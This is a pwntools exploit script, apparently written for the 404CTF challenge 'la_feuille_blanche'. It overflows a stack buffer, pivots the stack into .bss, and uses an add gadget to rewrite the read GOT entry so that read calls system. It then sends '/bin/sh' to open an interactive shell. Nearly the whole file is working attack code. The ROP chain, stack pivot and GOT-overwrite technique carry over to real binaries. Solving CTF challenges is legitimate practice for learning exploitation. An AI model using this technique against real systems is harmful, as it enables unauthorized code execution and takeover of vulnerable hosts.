#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("la_feuille_blanche_patched")
libc = ELF("./libc6-i386_2.27-3ubuntu1.6_amd64.so")
ld = ELF("./ld-2.27.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challenges.404ctf.fr", "31822"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

buff = exe.bss(0x800)
leave_ret = 0x0804844e # pop ebp ; cld ; leave ; ret
gadget0 = 0x08048405 # add eax, 0x804a01c ; add ecx, ecx ; ret
pop3 = 0x080484e9 # : pop esi ; pop edi ; pop ebp ; ret
pop7 = 0x080484e5 # add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
'''
read + 0x72
0xf7df4792 <read+114>:	mov    eax,DWORD PTR [esp+0x8]
   0xf7df4796 <read+118>:	add    esp,0x14
   0xf7df4799 <read+121>:	pop    ebx
   0xf7df479a <read+122>:	pop    esi
   0xf7df479b <read+123>:	ret    
'''

gadget_add = 0x080484dd # add dword ptr [ebx - 0x1c6ef3c], eax ; jne 0x80484c8 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop_ebx = 0x080482c9 # pop ebx ; ret
pop_edi_ebp = 0x080484ea # pop edi ; pop ebp ; ret

payload = b'A'*0x1c+p32(buff-4)
payload += p32(exe.sym['read'])+p32(pop3)+p32(0)+p32(buff)+p32(0x200)+p32(leave_ret)+p32(buff)

p.send(payload.ljust(0x50,b'\x00'))

payload2 = p32(pop7)+p32(pop_ebx)+p32(exe.got['read']+0x1c6ef3c)+p32(pop_edi_ebp)+p32(0x3f8e4672)+p32(0xdeadbeef)+p32(gadget_add)+p32(0xdeadbeef)*2

payload2 += p32(exe.sym['read'])+p32(0xdeadbeef)*2+p32(  0x100000000-((libc.sym['read']+0x72)-libc.sym['system']) ) +p32(0xdeadbeef)*2+p32(exe.got['read']+0x1c6ef3c)+p32(0xdeadbeef)
payload2 += p32(pop_edi_ebp)+p32(0x3f8e4672)+p32(0xdeadbeef)+p32(gadget_add)+p32(0xdeadbeef)*2
payload2 += p32(exe.sym['read'])+p32(pop_ebx)+p32(buff+104)+b'/bin/sh\x00'

print('size payload2 = '+str(len(payload2)))
p.send(payload2.ljust(0x72,b'\x00'))

p.interactive()

